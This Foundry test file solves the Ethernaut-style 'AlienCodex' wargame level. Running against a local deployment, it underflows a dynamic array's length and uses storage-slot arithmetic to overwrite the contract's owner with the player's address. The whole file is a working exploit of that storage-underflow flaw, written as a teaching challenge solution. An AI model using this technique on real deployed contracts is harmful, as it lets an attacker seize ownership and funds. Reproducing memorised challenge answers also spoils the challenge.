// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

interface IAlienCodex {
    function owner() external view returns (address);

    function contact() external view returns (bool);

    function makeContact() external;

    function retract() external;

    function revise(uint256 index, bytes32 content) external;
}

contract AlienCodexTest is Test {
    IAlienCodex target;
    address player = makeAddr("player");

    function setUp() public {
        target = IAlienCodex(deployCode("19_AlienCodex.sol:AlienCodex"));
    }

    function testSolve() public {
        assertNotEq(target.owner(), player);
        assertFalse(target.contact());

        vm.startPrank(player);
        target.makeContact();
        assertTrue(target.contact());
        target.retract();

        // Dynamic-array elements start at keccak256(the array's slot).
        uint256 codexDataSlot = uint256(keccak256(abi.encode(uint256(1))));

        // Storage arithmetic wraps modulo 2^256, so this index maps to slot 0.
        uint256 ownerSlotIndex;
        unchecked {
            ownerSlotIndex = 0 - codexDataSlot;
        }

        bytes32 playerAsBytes32 = bytes32(uint256(uint160(player)));
        target.revise(ownerSlotIndex, playerAsBytes32);

        vm.stopPrank();

        assertEq(target.owner(), player);
        assertFalse(target.contact());
    }
}
